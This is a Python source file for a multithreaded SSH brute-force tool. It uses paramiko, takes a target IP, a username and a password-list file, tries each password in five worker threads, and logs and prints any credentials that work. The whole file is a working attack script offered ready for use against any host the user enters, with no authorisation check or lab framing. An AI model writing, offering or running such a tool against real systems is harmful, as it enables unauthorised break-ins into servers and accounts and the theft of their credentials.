import paramiko
import threading
import queue
import logging
import signal
import sys
import time

# Configure logging
logging.basicConfig(
    filename='ssh_brute_force.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Thread-safe queue for passwords
password_queue = queue.Queue()
stop_flag = threading.Event()

def ssh_brute_force_worker(target, username):
    while not password_queue.empty() and not stop_flag.is_set():
        password = password_queue.get()
        password = password.strip()
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password, timeout=2)
            logging.info(f"Success! Username: {username}, Password: {password}")
            print(f"Success! Username: {username}, Password: {password}")
            stop_flag.set()  # Stop other threads
            return
        except paramiko.AuthenticationException:
            logging.warning(f"Failed: {password}")
        except Exception as e:
            logging.error(f"Error: {e}")
        finally:
            password_queue.task_done()

def load_passwords(password_file):
    try:
        with open(password_file, 'r') as file:
            for line in file:
                password_queue.put(line.strip())
    except FileNotFoundError:
        logging.error("Password file not found!")
        print("Error: Password file not found!")
        sys.exit(1)

def signal_handler(sig, frame):
    print("\nTerminating script...")
    stop_flag.set()
    sys.exit(0)

if __name__ == "__main__":
    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, signal_handler)

    target = input("Enter target IP address: ")
    username = input("Enter SSH username: ")
    password_file = input("Enter path to password file: ")

    # Load passwords into the queue
    load_passwords(password_file)

    # Number of threads to use
    thread_count = 5
    threads = []

    # Start threads
    for _ in range(thread_count):
        thread = threading.Thread(target=ssh_brute_force_worker, args=(target, username))
        threads.append(thread)
        thread.start()

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    if not stop_flag.is_set():
        print("Brute force completed. No valid credentials found.")
        logging.info("Brute force completed. No valid credentials found.")

